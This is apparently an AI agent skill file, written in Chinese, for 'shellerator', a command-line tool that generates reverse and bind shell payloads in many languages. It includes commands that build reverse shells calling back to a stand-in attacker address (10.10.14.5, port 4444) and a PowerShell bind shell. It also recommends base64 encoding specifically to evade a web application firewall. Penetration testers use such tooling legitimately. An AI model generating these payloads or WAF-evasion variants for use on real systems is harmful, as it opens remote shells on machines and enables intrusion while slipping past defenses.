---
name: shellerator
description: >
  此技能适用于用户询问关于"shellerator"、"在利用阶段为特定语言和编码生成自定义 shell 载荷"。CLI 反弹/绑定 shell 生成器，支持 20+ 种语言及可选编码。
---

# Shellerator

CLI Shell 载荷生成器 — 支持 20+ 种语言的反弹 shell 和绑定 shell。

## 快速开始

```bash
pip install shellerator

# 交互模式
shellerator

# 生成 bash 反弹 shell
shellerator -t reverse -l bash --ip ATTACKER --port 4444

# 生成 PowerShell 绑定 shell
shellerator -t bind -l powershell --port 4444

# 列出所有支持的语言
shellerator --list
```

## 核心参数

| 参数 | 用途 |
|------|------|
| `-t TYPE` | `reverse`（反弹）或 `bind`（绑定） |
| `-l LANG` | Shell 语言 |
| `--ip IP` | 攻击者 IP（反弹模式） |
| `--port PORT` | 端口 |
| `-e ENCODING` | 编码方式（base64、url 等） |
| `--list` | 列出支持的语言 |

## 支持的语言（示例）

`bash` · `sh` · `python` · `python3` · `perl` · `php` · `ruby` · `powershell` · `netcat` · `java` · `groovy` · `golang` · `lua` · `nodejs` · `socat` · `awk`

## 常用工作流

**为漏洞利用快速生成载荷：**
```bash
shellerator -t reverse -l python3 --ip 10.10.14.5 --port 4444
```

**Base64 编码以绕过 WAF：**
```bash
shellerator -t reverse -l bash --ip 10.10.14.5 --port 4444 -e base64
```

## 资源文件

| 文件 | 加载时机 |
|------|----------|
| `references/` | 语言选择与编码技巧 |
